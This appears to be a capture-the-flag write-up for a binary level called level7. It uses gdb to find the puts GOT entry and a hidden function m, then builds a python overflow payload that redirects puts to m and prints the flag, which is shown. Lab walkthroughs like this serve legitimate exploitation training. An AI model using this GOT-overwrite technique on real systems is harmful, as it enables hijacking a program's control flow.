### Download binary
``scp -P4242 level7@192.168.31.170:/home/user/level7/level7 ~/Desktop/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (see sources)

We see that our flag is stored in a variable named c. We also see that there is a piece of dead code (the function m) that print our variable c. Our goal is to call this function. We will be able to do it by replacing the call to **puts** with a call to **m**. The binary call 2 argument, so we have to give it 2.

----

### Building the payload

Our goal is to do something like this

**Char to overflow + adress of puts** and **Adress of m**

first we need to find both adresses

`(gdb) info functions `
>0x080483c0  fgets@plt
[...]
0x080484f4  m

**Getting GOT adress range :**

``(gdb) info files``
>[...]
0x08049908 - 0x08049938 is .got.plt

**Let's find the function we want to overwrite, puts() :**

``(gdb) x/16wx 0x08049908``

>0x8049908 <_GLOBAL_OFFSET_TABLE_>:	0x0804983c	0x00000000	0x00000000	0x080483b6
[...]
0x8049928 <puts@got.plt>:	0x08048406	0x08048416	0x08048426	0x08048436
[...]

Now that we have our 2 adress we can build our final payload :

``$(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')``

----

#### Getting the flag

``./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')``
>5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1689839559
